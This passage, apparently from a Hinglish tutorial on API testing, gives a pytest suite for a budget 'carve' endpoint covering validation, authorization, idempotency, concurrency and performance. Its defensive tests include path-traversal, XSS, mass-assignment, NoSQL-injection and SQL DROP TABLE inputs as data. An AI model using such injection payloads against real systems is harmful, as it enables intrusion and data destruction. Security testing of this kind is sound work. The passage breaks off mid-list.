            {"id": "sc_civil",   "name": "Civil",   "plannedAmount": 5_000_000},
            {"id": "sc_elec",    "name": "Electric","plannedAmount": 3_000_000},
            {"id": "sc_plumb",   "name": "Plumbing","plannedAmount": 2_000_000},
        ],
    })
    assert resp.status_code == 201, f"Fixture setup fail: {resp.status_code} {resp.text}"
    b = resp.json()

    yield b

    # Teardown — best-effort, failure pe test fail mat karo
    try:
        api_admin.delete(f"/api/v1/budgets/{b['id']}")
    except Exception as exc:
        print(f"[teardown] budget {b['id']} cleanup fail: {exc}")


@pytest.fixture
def budget_id(budget):
    return budget["id"]


@pytest.fixture
def scope_id():
    return "sc_civil"


@pytest.fixture
def valid_payload(scope_id):
    return {"scopeId": scope_id, "amount": 250_000, "currency": "INR",
            "notes": "pytest carve"}
```

## 7.4 Dimension 1 — FUNCTIONAL (happy path)

```python
# tests/test_carve_functional.py
import pytest


class TestCarveFunctional:
    """CV-F-*: happy path. Ye kam tests hote hain lekin sabse important hote hain —
    agar ye fail ho to baaki sab meaningless hai."""

    def test_CV_F_01_valid_carve_returns_201_with_location(self, api, budget_id, valid_payload):
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)

        # Layer 1: status
        assert r.status_code == 201, f"Expected 201, got {r.status_code}: {r.text[:300]}"

        # Layer 2: content type
        assert r.headers["Content-Type"].startswith("application/json")

        # Layer 3: 201-specific header
        location = r.headers.get("Location")
        assert location, "201 ke saath Location header nahi aaya"
        assert "/carves/" in location

        # Layer 5: business values — jo bheja wahi wapas aaya?
        body = r.json()
        assert body["scopeId"] == valid_payload["scopeId"]
        assert body["amount"] == valid_payload["amount"]
        assert body["currency"] == valid_payload["currency"]
        assert body["notes"] == valid_payload["notes"]
        assert body["budgetId"] == budget_id
        assert body["status"] == "ACTIVE"
        assert body["id"].startswith("cv_")
        assert body["createdBy"].startswith("u_")

        # Location header ka id body ke id se match kare
        assert body["id"] in location

    def test_CV_F_02_created_carve_is_fetchable(self, api, budget_id, valid_payload):
        """Layer 6: SIDE EFFECT. 201 aa gaya iska matlab nahi ki save hua.
        Read back karo."""
        created = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        location = created.headers["Location"]

        fetched = api.get(location)
        assert fetched.status_code == 200, "Location URL pe resource nahi mila"
        assert fetched.json()["id"] == created.json()["id"]
        assert fetched.json()["amount"] == valid_payload["amount"]

    def test_CV_F_03_coverage_reflects_the_carve(self, api, budget_id, valid_payload):
        """Layer 6: DOWNSTREAM side effect. Carve ka asar coverage endpoint pe
        dikhna chahiye — ye do endpoints ke beech ka SEAM hai.

        [REAL lesson] Merlin mein har component apne aap sahi tha lekin seams toote the.
        Isliye main deliberately cross-endpoint consistency test karta hoon."""
        before = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()

        api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)

        after = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()

        assert after["carvedAmount"] == before["carvedAmount"] + valid_payload["amount"], (
            f"Coverage update nahi hua: {before['carvedAmount']} -> {after['carvedAmount']}, "
            f"expected +{valid_payload['amount']}"
        )
        assert after["remainingAmount"] == before["remainingAmount"] - valid_payload["amount"]
        # Invariant
        assert after["carvedAmount"] + after["remainingAmount"] == after["totalBudget"]

    def test_CV_F_04_no_unintended_side_effects(self, api, api_admin, budget_id, valid_payload):
        """Layer 7: NON-EFFECTS. Carve karne pe DOOSRE scopes affect nahi hone chahiye.
        Ye dimension zyadatar suites mein missing hoti hai."""
        before = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        other_scopes_before = {c["scopeId"]: c for c in before["carves"]
                               if c["scopeId"] != valid_payload["scopeId"]}

        api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)

        after = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        other_scopes_after = {c["scopeId"]: c for c in after["carves"]
                              if c["scopeId"] != valid_payload["scopeId"]}

        assert other_scopes_before == other_scopes_after, "Doosre scopes bhi badal gaye"
        assert after["totalBudget"] == before["totalBudget"], "Total budget badal gaya"
```

## 7.5 Dimension 2 — VALIDATION (parametrized)

```python
# tests/test_carve_validation.py

class TestCarveValidation:
    """CV-V-*: har field, har invalid value. Parametrized taaki
    naya case add karna ek line ho."""

    # ---------- required fields ----------
    @pytest.mark.parametrize("missing_field", ["scopeId", "amount"])
    def test_CV_V_01_required_field_missing(self, api, budget_id, valid_payload, missing_field):
        payload = {k: v for k, v in valid_payload.items() if k != missing_field}
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)

        assert r.status_code in (400, 422), f"Missing {missing_field}: got {r.status_code}"
        assert r.status_code != 500, f"Missing {missing_field} pe 500 — validation missing"

        # Error mein batana chahiye KAUNSA field
        assert missing_field in r.text, (
            f"Error message mein '{missing_field}' nahi hai — "
            "frontend field ke neeche error nahi dikha payega"
        )

    # ---------- amount — numeric boundary + type ----------
    @pytest.mark.parametrize("amount,expected,reason", [
        (1,             201, "minimum valid"),
        (250_000,       201, "normal"),
        (5_000_000,     201, "exactly scope planned amount — boundary"),

        (0,             (400, 422), "zero — meaningless carve"),
        (-1,            (400, 422), "negative"),
        (-250_000,      (400, 422), "large negative"),
        (0.5,           (400, 422), "fractional — money integer paise mein hona chahiye"),
        (250_000.99,    (400, 422), "float"),
        ("250000",      (400, 422), "string number — type coercion nahi honi chahiye"),
        ("abc",         (400, 422), "non-numeric string"),
        (None,          (400, 422), "null"),
        (True,          (400, 422), "boolean — Python mein True == 1, JSON mein bhi trap"),
        ([250000],      (400, 422), "array"),
        ({"v": 250000}, (400, 422), "object"),
        (2**63,         (400, 422), "int64 overflow"),
        (10**30,        (400, 422), "absurdly large"),
        (float("inf"),  (400, 422), "infinity"),
    ])
    def test_CV_V_02_amount_validation(self, api, budget_id, valid_payload,
                                       amount, expected, reason):
        """Ye table hi 17 test cases hai. Boundary values (0, 1, exact limit)
        deliberately included hain — off-by-one bugs yahin milte hain."""
        payload = {**valid_payload, "amount": amount}
        try:
            r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
        except (ValueError, TypeError):
            pytest.skip(f"{reason}: JSON serialize nahi ho paaya (client-side limitation)")

        expected_codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in expected_codes, (
            f"amount={amount!r} ({reason}): expected {expected_codes}, got {r.status_code}\n"
            f"{r.text[:300]}"
        )
        assert r.status_code != 500, f"amount={amount!r} pe 500 — unhandled exception"

    # ---------- currency ----------
    @pytest.mark.parametrize("currency,expected", [
        ("INR",   201),
        ("USD",   201),
        ("inr",   (400, 422, 201)),   # case sensitivity — behaviour define hona chahiye
        ("XYZ",   (400, 422)),        # invalid ISO code
        ("",      (400, 422)),
        ("INRR",  (400, 422)),
        ("IN",    (400, 422)),
        (None,    (400, 422, 201)),   # optional ho sakta hai, default INR
        (123,     (400, 422)),
    ])
    def test_CV_V_03_currency_validation(self, api, budget_id, valid_payload, currency, expected):
        payload = {**valid_payload, "currency": currency}
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
        codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in codes, f"currency={currency!r}: got {r.status_code}"

    # ---------- scopeId ----------
    @pytest.mark.parametrize("scope_id,expected,reason", [
        ("sc_civil",      201,        "valid"),
        ("sc_nonexistent",(400, 404, 422), "unknown scope"),
        ("",              (400, 422), "empty"),
        (" ",             (400, 422), "whitespace only"),
        ("sc_" + "a"*500, (400, 422), "very long"),
        (None,            (400, 422), "null"),
        (123,             (400, 422), "wrong type"),
    ])
    def test_CV_V_04_scope_validation(self, api, budget_id, valid_payload,
                                      scope_id, expected, reason):
        payload = {**valid_payload, "scopeId": scope_id}
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
        codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in codes, f"{reason}: got {r.status_code}"

    # ---------- notes — string field ----------
    @pytest.mark.parametrize("notes,should_pass", [
        ("normal text",                          True),
        ("",                                     True),
        (None,                                   True),
        ("a" * 2000,                             True),    # at limit
        ("a" * 2001,                             False),   # over limit
        ("a" * 100000,                           False),   # DoS-scale
        ("Multi\nline\ntext",                    True),
        ("Unicode: अनुबंध 🏗️ 中文",                True),
        ("Quotes \" and ' and \\ backslash",     True),
        ("<script>alert(1)</script>",            True),    # store OK, escape on render
        ("\x00null byte",                        False),
    ])
    def test_CV_V_05_notes_validation(self, api, budget_id, valid_payload, notes, should_pass):
        payload = {**valid_payload, "notes": notes}
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
        if should_pass:
            assert r.status_code == 201, f"notes={notes[:40]!r}: got {r.status_code}"
            # Round trip — encoding damage check
            if notes:
                assert r.json()["notes"] == notes, "notes round-trip mein badla"
        else:
            assert r.status_code in (400, 413, 422), f"notes={notes[:40]!r}: got {r.status_code}"

    # ---------- path param ----------
    @pytest.mark.parametrize("bad_budget_id,expected", [
        ("nonexistent",                    404),
        ("000000000000000000000000",       404),   # valid ObjectId format, doesn't exist
        ("not-an-objectid",                (400, 404)),
        ("",                               (404, 405)),
        ("../../etc/passwd",               (400, 404)),
        ("%2e%2e%2f",                      (400, 404)),
        ("a" * 1000,                       (400, 404, 414)),
    ])
    def test_CV_V_06_path_param_validation(self, api, valid_payload, bad_budget_id, expected):
        r = api.post(f"/api/v1/budgets/{bad_budget_id}/carve", json=valid_payload)
        codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in codes, f"budgetId={bad_budget_id!r}: got {r.status_code}"
        assert r.status_code != 500

    # ---------- all errors at once ----------
    def test_CV_V_07_multiple_errors_reported_together(self, api, budget_id):
        r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                     json={"amount": -100, "currency": "XYZ"})   # scopeId bhi missing
        body = r.json()
        errors = body.get("errors") or body.get("fieldErrors") or []
        assert len(errors) >= 2, (
            f"Sirf {len(errors)} error mila. 3 problems hain — fail-fast validation hai, "
            "user ko ek-ek karke fix karna padega"
        )
```

## 7.6 Dimension 3 — AUTHORIZATION (matrix)

```python
# tests/test_carve_authorization.py

class TestCarveAuthorization:
    """CV-A-*: role matrix + tenant isolation."""

    # ---------- role matrix ----------
    @pytest.mark.parametrize("client_fixture,expected,reason", [
        ("api_admin",          201, "ADMIN can carve"),
        ("api_sales_manager",  201, "SALES_MANAGER can carve"),
        ("api_viewer",         403, "VIEWER cannot carve"),
        ("api_site_engineer",  403, "SITE_ENGINEER cannot carve"),
        ("api_no_auth",        401, "no token"),
    ])
    def test_CV_A_01_role_matrix(self, request, budget_id, valid_payload,
                                 client_fixture, expected, reason):
        """Role matrix — negative cases hi asli bugs pakadte hain.
        Naya role add karna = ek line."""
        client = request.getfixturevalue(client_fixture)
        payload = {**valid_payload, "scopeId": f"sc_{client_fixture}"}
        r = client.post(f"/api/v1/budgets/{budget_id}/carve", json=payload)
        assert r.status_code == expected, f"{reason}: got {r.status_code}"

    def test_CV_A_02_denied_role_causes_no_side_effect(self, api, api_viewer,
                                                       budget_id, valid_payload):
        """403 aaya iska matlab nahi ki kuch hua nahi.
        Kabhi-kabhi authorization check AFTER the write hota hai."""
        before = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        api_viewer.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        after = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        assert before == after, "403 dene ke bawajood state badal gaya"

    # ---------- tenant isolation ----------
    @pytest.mark.security
    def test_CV_A_03_cross_org_budget_returns_404(self, api_other_org, budget_id, valid_payload):
        """[REAL — multi-tenant] Doosre org ka user hamare budget pe carve nahi kar sakta.
        Aur 404 aana chahiye, 403 nahi — warna existence leak hoti hai."""
        r = api_other_org.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        assert r.status_code == 404, (
            f"Cross-org pe {r.status_code}. 403 hai to budget ka existence leak ho raha hai; "
            f"201/200 hai to tenant isolation poori tarah tooti hai"
        )

    @pytest.mark.security
    @pytest.mark.parametrize("override_method", ["header", "body", "query"])
    def test_CV_A_04_org_scoping_not_overridable(self, api, budget_id, valid_payload,
                                                 override_method, other_org_id):
        """Org identity JWT se aani chahiye. Teeno channels test karo."""
        kwargs = {"json": valid_payload}
        if override_method == "header":
            kwargs["headers"] = {"X-Org-Id": other_org_id}
        elif override_method == "body":
            kwargs["json"] = {**valid_payload, "orgId": other_org_id}
        else:
            kwargs["params"] = {"orgId": other_org_id}

        r = api.post(f"/api/v1/budgets/{budget_id}/carve", **kwargs)
        if r.status_code == 201:
            assert r.json().get("orgId", MY_ORG_ID) == MY_ORG_ID, (
                f"orgId {override_method} se override ho gaya"
            )

    # ---------- bad tokens (reuse the Part 5 matrix) ----------
    @pytest.mark.security
    @pytest.mark.parametrize("token,name", BAD_TOKENS)
    def test_CV_A_05_bad_tokens_rejected(self, budget_id, valid_payload, token, name):
        tok = token() if callable(token) else token
        headers = {} if tok is None else {"Authorization": f"Bearer {tok}"}
        r = requests.post(f"{BASE_URL}/api/v1/budgets/{budget_id}/carve",
                          json=valid_payload, headers=headers, timeout=30)
        assert r.status_code == 401, f"{name}: got {r.status_code}"
```

## 7.7 Dimension 4 — BUSINESS RULES

```python
# tests/test_carve_business_rules.py

class TestCarveBusinessRules:
    """CV-B-*: domain logic. Ye tests domain knowledge dikhate hain —
    aur interview mein sabse zyada impress karte hain."""

    def test_CV_B_01_cannot_carve_more_than_remaining(self, api, budget, valid_payload):
        """Budget 10,000,000 hai. 10,000,001 carve nahi hona chahiye."""
        r = api.post(f"/api/v1/budgets/{budget['id']}/carve",
                     json={**valid_payload, "amount": budget["totalAmount"] + 1})
        assert r.status_code in (400, 409, 422), (
            f"Over-budget carve accept ho gaya ({r.status_code}) — "
            "financial control missing"
        )

    @pytest.mark.parametrize("amount_delta,expected,name", [
        (-1,  201,        "one less than remaining — should pass"),
        (0,   201,        "exactly remaining — boundary, should pass"),
        (1,   (400, 409, 422), "one more than remaining — should fail"),
    ])
    def test_CV_B_02_budget_limit_boundary(self, api, budget, scope_id,
                                           amount_delta, expected, name):
        """Boundary test — off-by-one bugs exactly yahan milte hain.
        'exactly at the limit' allowed hona chahiye, 'limit + 1' nahi."""
        coverage = api.get(f"/api/v1/budgets/{budget['id']}/coverage").json()
        remaining = coverage["remainingAmount"]

        r = api.post(f"/api/v1/budgets/{budget['id']}/carve",
                     json={"scopeId": scope_id, "amount": remaining + amount_delta,
                           "currency": "INR"})
        codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in codes, f"{name}: got {r.status_code}"

    def test_CV_B_03_duplicate_scope_returns_409(self, api, budget_id, valid_payload):
        """Ek scope ek hi baar carve ho sakta hai."""
        first = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        assert first.status_code == 201

        second = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        assert second.status_code == 409, (
            f"Duplicate carve pe {second.status_code}. "
            "500 = raw DB exception leak. 201 = duplicate financial record."
        )
        # Machine-readable error code
        body = second.json()
        assert body.get("code"), "409 pe machine-readable error code nahi hai"

        # Aur state exactly ek carve hona chahiye
        coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        matching = [c for c in coverage["carves"] if c["scopeId"] == valid_payload["scopeId"]]
        assert len(matching) == 1

    @pytest.mark.parametrize("budget_status,expected", [
        ("ACTIVE",    201),
        ("DRAFT",     (400, 409, 422)),
        ("CLOSED",    (400, 409, 422)),
        ("ARCHIVED",  (400, 409, 422)),
    ])
    def test_CV_B_04_budget_state_machine(self, api, api_admin, budget_in_state,
                                          valid_payload, budget_status, expected):
        """State machine: sirf ACTIVE budget pe carve ho sakta hai."""
        bid = budget_in_state(budget_status)
        r = api.post(f"/api/v1/budgets/{bid}/carve", json=valid_payload)
        codes = expected if isinstance(expected, tuple) else (expected,)
        assert r.status_code in codes, f"status={budget_status}: got {r.status_code}"

    def test_CV_B_05_scope_planned_amount_respected(self, api, budget):
        """Business rule jo mujhe CONFIRM karni padegi:
        kya carve scope ke plannedAmount se zyada ho sakta hai?
        Agar spec mein nahi likha, ye ek QUESTION hai — bug nahi.
        Main isko test likhta hoon aur PO se confirm karta hoon."""
        civil_planned = 5_000_000
        r = api.post(f"/api/v1/budgets/{budget['id']}/carve",
                     json={"scopeId": "sc_civil", "amount": civil_planned + 1_000_000,
                           "currency": "INR"})
        # Behaviour document karo, chahe jo bhi ho
        print(f"[SPEC QUESTION] Scope over-carve returned {r.status_code}")
        assert r.status_code in (201, 400, 409, 422), "Kam se kam 500 nahi hona chahiye"

    def test_CV_B_06_multiple_scopes_sum_correctly(self, api, budget_id):
        """Multi-step business flow — teen scopes carve karo,
        aggregate arithmetic verify karo."""
        amounts = {"sc_civil": 1_000_000, "sc_elec": 500_000, "sc_plumb": 250_000}
        for scope, amt in amounts.items():
            r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                         json={"scopeId": scope, "amount": amt, "currency": "INR"})
            assert r.status_code == 201

        coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        assert coverage["carvedAmount"] == sum(amounts.values())
        assert coverage["carvedAmount"] + coverage["remainingAmount"] == coverage["totalBudget"]
        assert len(coverage["carves"]) == 3
```

## 7.8 Dimension 5 — IDEMPOTENCY

```python
# tests/test_carve_idempotency.py

class TestCarveIdempotency:
    """CV-I-*: retry safety."""

    def test_CV_I_01_same_idempotency_key_returns_same_result(self, api, budget_id, valid_payload):
        key = str(uuid.uuid4())
        h = {"Idempotency-Key": key}

        r1 = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload, headers=h)
        r2 = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload, headers=h)

        assert r1.status_code == 201
        assert r2.status_code in (200, 201), (
            f"Same idempotency key pe {r2.status_code} — "
            "agar 409 hai to key honour nahi ho rahi, duplicate constraint chal raha hai"
        )
        assert r1.json()["id"] == r2.json()["id"], (
            "Same key se DO ALAG resources bane — idempotency toot gayi"
        )

        # Aur DB mein sirf ek
        coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        matching = [c for c in coverage["carves"] if c["scopeId"] == valid_payload["scopeId"]]
        assert len(matching) == 1, f"{len(matching)} carves bane"

    def test_CV_I_02_different_key_creates_new_resource(self, api, budget_id):
        """Alag key = alag operation. (Yahan duplicate scope ki wajah se 409 aayega,
        jo sahi hai — matlab idempotency key ne business rule bypass nahi kiya)"""
        p1 = {"scopeId": "sc_civil", "amount": 100_000, "currency": "INR"}
        p2 = {"scopeId": "sc_elec",  "amount": 100_000, "currency": "INR"}

        r1 = api.post(f"/api/v1/budgets/{budget_id}/carve", json=p1,
                      headers={"Idempotency-Key": str(uuid.uuid4())})
        r2 = api.post(f"/api/v1/budgets/{budget_id}/carve", json=p2,
                      headers={"Idempotency-Key": str(uuid.uuid4())})

        assert r1.status_code == 201 and r2.status_code == 201
        assert r1.json()["id"] != r2.json()["id"]

    @pytest.mark.security
    def test_CV_I_03_same_key_different_payload_is_rejected(self, api, budget_id):
        """Sabse subtle idempotency bug: same key, ALAG payload.
        Server ko 422 dena chahiye — kyunki client ne key reuse kar di
        alag operation ke liye. Agar server chupchap CACHED result de deta hai,
        client ko lagega uska naya operation ho gaya — jabki hua kuch nahi."""
        key = str(uuid.uuid4())
        h = {"Idempotency-Key": key}

        r1 = api.post(f"/api/v1/budgets/{budget_id}/carve",
                      json={"scopeId": "sc_civil", "amount": 100_000, "currency": "INR"},
                      headers=h)
        assert r1.status_code == 201

        r2 = api.post(f"/api/v1/budgets/{budget_id}/carve",
                      json={"scopeId": "sc_elec", "amount": 999_999, "currency": "INR"},
                      headers=h)

        assert r2.status_code in (409, 422), (
            f"Same key + different payload pe {r2.status_code}. "
            "Agar 200/201 aur pehla result mila, to client ko laga uska "
            "second carve ho gaya — silent data loss."
        )

    def test_CV_I_04_timeout_retry_creates_exactly_one(self, api, budget_id, valid_payload):
        """Real-world scenario: client timeout, phir retry.
        Ye 504 ke baad wala exact case hai."""
        key = str(uuid.uuid4())
        h = {"Idempotency-Key": key}

        try:
            api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload,
                     headers=h, timeout=0.001)      # force client timeout
        except requests.exceptions.Timeout:
            pass

        retry = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload,
                         headers=h, timeout=60)
        assert retry.status_code in (200, 201)

        coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        matching = [c for c in coverage["carves"] if c["scopeId"] == valid_payload["scopeId"]]
        assert len(matching) == 1, f"Timeout+retry se {len(matching)} carves bane"
```

## 7.9 Dimension 6 — CONCURRENCY

```python
# tests/test_carve_concurrency.py
import concurrent.futures


class TestCarveConcurrency:
    """CV-C-*: [REAL] ye wo test hai jo Merlin mein PASS hua tha.
    Interview mein ye batana strong hai — kyunki most QA concurrency test
    likhta hi nahi."""

    def test_CV_C_01_two_concurrent_carves_exactly_one_wins(self, api, budget_id, valid_payload):
        """[REAL] Do concurrent carves same scope pe.
        Expected: exactly ek 201, exactly ek 409.

        Ye DB-level unique partial index se enforce hota hai.
        Application-level 'check-then-insert' mein race window hota hai —
        dono requests check pass kar leti hain, dono insert kar deti hain."""
        def carve():
            return api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)

        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
            responses = [f.result() for f in [ex.submit(carve) for _ in range(2)]]

        codes = sorted(r.status_code for r in responses)
        assert codes == [201, 409], (
            f"Expected [201, 409], got {codes}.\n"
            f"[201, 201] = race condition, duplicate carve bana\n"
            f"[500, 201] = raw DB exception leak ho raha hai (constraint hai lekin handle nahi)\n"
            f"[409, 409] = dono fail, koi carve nahi bana"
        )

        # Status codes pe bharosa mat karo — actual state verify karo
        coverage = api.get(f"/api/v1/budgets/{budget_id}/coverage").json()
        matching = [c for c in coverage["carves"] if c["scopeId"] == valid_payload["scopeId"]]
        assert len(matching) == 1, f"DB mein {len(matching)} carves"
        assert matching[0]["amount"] == valid_payload["amount"]

    @pytest.mark.parametrize("concurrency", [2, 5, 10, 25])
    def test_CV_C_02_high_concurrency_still_exactly_one(self, api, budget_id,
                                                        valid_payload, concurrency):
        """2 pe pass hona kaafi nahi. Race window chhota hota hai —
        zyada concurrency se hit hone ka chance badhta hai."""
        def carve():
            return api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)

        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as ex:
            responses = [f.result() for f in [ex.submit(carve) for _ in range(concurrency)]]

        created = [r for r in responses if r.status_code == 201]
        conflicts = [r for r in responses if r.status_code == 409]
        errors = [r for r in responses if r.status_code >= 500]

        assert not errors, (
            f"{len(errors)} requests ne 5xx diya — DB constraint violation "
            f"gracefully handle nahi ho rahi. Sample: {errors[0].text[:300]}"
        )
        assert len(created) == 1, f"{len(created)} carves bane at concurrency={concurrency}"
        assert len(conflicts) == concurrency - 1

    def test_CV_C_03_concurrent_carves_different_scopes_all_succeed(self, api, budget_id):
        """Ulta test: ALAG scopes pe concurrent carves SAB succeed hone chahiye.
        Agar lock bahut broad hai (poore budget pe), ye fail hoga —
        aur wo ek performance/correctness issue hai."""
        scopes = ["sc_civil", "sc_elec", "sc_plumb"]

        def carve(scope):
            return api.post(f"/api/v1/budgets/{budget_id}/carve",
                            json={"scopeId": scope, "amount": 100_000, "currency": "INR"})

        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
            responses = list(ex.map(carve, scopes))

        codes = [r.status_code for r in responses]
        assert codes == [201, 201, 201], (
            f"Alag scopes pe concurrent carves fail hue: {codes}. "
            "Lock granularity bahut broad hai — throughput problem"
        )

    def test_CV_C_04_concurrent_carves_do_not_exceed_budget(self, api, budget):
        """Sabse important financial concurrency test:
        budget 10,000,000 hai. 6 concurrent carves of 2,000,000 each = 12,000,000.
        Alag-alag scopes hain, to duplicate constraint nahi lagegi.
        Total budget limit LAGNI CHAHIYE — warna over-carve ho jayega.

        Ye 'check-then-act' race ka classic financial version hai."""
        scopes = [f"sc_{i}" for i in range(6)]

        def carve(scope):
            return api.post(f"/api/v1/budgets/{budget['id']}/carve",
                            json={"scopeId": scope, "amount": 2_000_000, "currency": "INR"})

        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as ex:
            responses = list(ex.map(carve, scopes))

        coverage = api.get(f"/api/v1/budgets/{budget['id']}/coverage").json()
        assert coverage["carvedAmount"] <= budget["totalAmount"], (
            f"OVER-CARVE: {coverage['carvedAmount']} > budget {budget['totalAmount']}. "
            "Concurrent requests ne budget limit ki check-then-act race exploit ki. "
            "Fix: atomic conditional update ya DB constraint, application check nahi."
        )
        assert coverage["remainingAmount"] >= 0
```

## 7.10 Dimension 7 — SCHEMA

```python
# tests/test_carve_schema.py

class TestCarveSchema:
    """CV-S-*"""

    def test_CV_S_01_response_matches_schema(self, api, budget_id, valid_payload):
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        assert r.status_code == 201
        validate_schema(r.json(), CARVE_SCHEMA, "POST /budgets/{id}/carve")

    @pytest.mark.security
    def test_CV_S_02_no_internal_fields_leaked(self, api, budget_id, valid_payload):
        """additionalProperties: false + explicit denylist."""
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json=valid_payload)
        body = r.json()
        leaked = FORBIDDEN_FIELDS & set(body)
        assert not leaked, f"Internal fields leak: {leaked}"

    def test_CV_S_03_error_responses_match_error_schema(self, api, budget_id):
        """Error responses ka bhi schema hona chahiye — clients unhe parse karte hain."""
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json={"amount": -1})
        validate_schema(r.json(), ERROR_SCHEMA, "validation error")

    @pytest.mark.security
    def test_CV_S_04_mass_assignment_blocked(self, api, budget_id, valid_payload):
        """Mass assignment: client server-controlled fields set karne ki koshish karta hai.
        Server ko unhe IGNORE karna chahiye (ya 400 dena chahiye) — accept nahi."""
        r = api.post(f"/api/v1/budgets/{budget_id}/carve", json={
            **valid_payload,
            "id": "cv_ATTACKER_CHOSEN",
            "status": "SUPERSEDED",
            "createdBy": "u_someone_else",
            "createdAt": "2020-01-01T00:00:00Z",
            "orgId": "org_OTHER",
        })
        if r.status_code == 201:
            b = r.json()
            assert b["id"] != "cv_ATTACKER_CHOSEN", "id client se set ho gaya"
            assert b["status"] == "ACTIVE",         "status client se set ho gaya"
            assert b["createdBy"] != "u_someone_else", "createdBy spoof ho gaya — audit trail jhooth"
            assert not b["createdAt"].startswith("2020"), "createdAt backdate ho gaya"
        else:
            assert r.status_code in (400, 422), f"Unknown fields pe {r.status_code}"
```

## 7.11 Dimension 8 — PERFORMANCE

```python
# tests/test_carve_performance.py

class TestCarvePerformance:
    """CV-P-*: functional suite mein basic performance guard.
    Ye proper load testing ki jagah nahi leta — ye regression detector hai."""

    def test_CV_P_01_single_carve_latency(self, api, budget_id):
        """Warm connection pe median latency."""
        api.get(f"/api/v1/budgets/{budget_id}/coverage")    # warm up

        samples = []
        for i in range(10):
            t0 = time.perf_counter()
            r = api.post(f"/api/v1/budgets/{budget_id}/carve",
                         json={"scopeId": f"sc_perf_{i}", "amount": 1000, "currency": "INR"})
            samples.append(time.perf_counter() - t0)
            assert r.status_code == 201

        samples.sort()
        median = samples[len(samples) // 2]
        p90 = samples[int(len(samples) * 0.9)]

        assert median < 0.8, f"Median {median*1000:.0f}ms > 800ms"
        assert p90 < 2.0, f"p90 {p90*1000:.0f}ms > 2000ms"

    def test_CV_P_02_coverage_does_not_degrade_with_carve_count(self, api, budget_id):
        """N+1 detector: coverage endpoint ka time carve count ke saath
        LINEAR se zyada nahi badhna chahiye.
        Agar har carve ke liye alag query ho rahi hai, ye test pakad lega."""
        def time_coverage():
            api.get(f"/api/v1/budgets/{budget_id}/coverage")     # warm
            t0 = time.perf_counter()
            api.get(f"/api/v1/budgets/{budget_id}/coverage")
            return time.perf_counter() - t0

        t_empty = time_coverage()

        for i in range(50):
            api.post(f"/api/v1/budgets/{budget_id}/carve",
                     json={"scopeId": f"sc_n1_{i}", "amount": 1000, "currency": "INR"})

        t_full = time_coverage()

        assert t_full < t_empty * 5 + 0.5, (
            f"Coverage 0 carves pe {t_empty*1000:.0f}ms, 50 carves pe {t_full*1000:.0f}ms "
            f"({t_full/t_empty:.1f}x). Ye N+1 query pattern ka signature hai."
        )

    @pytest.mark.slow
    def test_CV_P_03_concurrent_load_no_errors(self, api, budget_id):
        """20 concurrent carves alag scopes pe. Koi 5xx nahi aana chahiye.
        Ye connection pool exhaustion, deadlock, aur transaction timeout pakadta hai."""
        def carve(i):
            return api.post(f"/api/v1/budgets/{budget_id}/carve",
                            json={"scopeId": f"sc_load_{i}", "amount": 1000, "currency": "INR"})

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            responses = list(ex.map(carve, range(20)))

        errors = [r for r in responses if r.status_code >= 500]
        assert not errors, (
            f"{len(errors)}/20 requests 5xx pe fail hui under concurrency.\n"
            f"Sample: {errors[0].status_code} {errors[0].text[:300]}"
        )
```

## 7.12 Cross-cutting — SECURITY

```python
# tests/test_carve_security.py

class TestCarveSecurity:
    """CV-SEC-*"""

    @pytest.mark.security
    @pytest.mark.parametrize("payload,name", [
        ({"scopeId": {"$ne": None}, "amount": 1},        "NoSQL injection — $ne operator"),
        ({"scopeId": {"$gt": ""}, "amount": 1},          "NoSQL injection — $gt"),
        ({"scopeId": {"$regex": ".*"}, "amount": 1},     "NoSQL injection — $regex"),
        ({"scopeId": "'; DROP TABLE carves; --", "amount": 1}, "SQL injection"),
        ({"scopeId": "sc_civil", "amount": {"$gt": 0}},  "NoSQL in numeric field"),
        ({"scopeId": "../../../etc/passwd", "amount": 1}, "path traversal"),
